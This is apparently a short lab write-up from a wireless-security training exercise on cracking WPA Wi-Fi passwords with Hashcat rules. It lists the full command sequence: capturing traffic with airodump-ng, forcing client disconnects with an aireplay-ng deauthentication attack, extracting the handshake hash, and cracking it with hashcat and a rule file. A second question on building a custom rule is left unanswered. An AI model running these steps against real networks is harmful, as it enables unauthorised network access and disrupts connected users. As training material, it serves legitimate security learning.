# [Hashcat Rules](Hashcat%20Rules.md)
### Crack the Wi-Fi network named "HackMe" using the 'OneRuleToRuleThemStill' rule in combination with the wordlist located at '/opt/wordlist.txt'. What is the recovered password?

```sh
airodump-ng -c 1 -w WPA wlan0mon
```

![](Screenshot%202026-09-23%20at%2009.10.56.png)

```sh
aireplay-ng -0 5 -a 02:00:00:00:07:00 -c 02:00:00:00:05:00 wlan0mon
```

When we have a .cap file that contains hash using hcxpcapngtool

```sh
hcxpcapngtool -o hash WPA-01.pcap
```
![](Screenshot%202026-09-23%20at%2009.27.40.png)

```sh
hashcat -m 22000 hash /opt/wordlist.txt -r OneRuleToRuleThemStill.rule
```

![](Screenshot%202026-09-23%20at%2009.32.53.png)
### Crack the password of Wi-Fi network named "HTB-Wireless", using a rule where the second character is capitalized, all occurrences of the letter 's' are replaced with '$', any letters 'b' are capitalized, and the last character is repeated three times.

